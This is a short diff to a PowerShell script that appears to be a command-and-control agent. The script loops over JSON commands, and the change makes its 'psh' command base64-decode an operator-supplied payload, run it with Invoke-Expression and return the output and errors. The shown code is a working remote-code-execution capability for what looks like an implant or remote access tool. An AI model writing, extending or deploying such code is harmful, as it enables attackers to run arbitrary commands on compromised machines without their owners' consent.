@@ -73,8 +73,12 @@ while ($True) {
 		}
 
     elseif($jsObject['cmnd'].split(" ")[0] -eq "psh") {
-      # PSH c
-      $retval = "[*] Ran PS file..."
+      $psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+			$retval = IEX $psdata -ErrorVariable err 2>&1
+			if($err) {
+				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
+				$err = ""
+			}
     }
 
 		else {
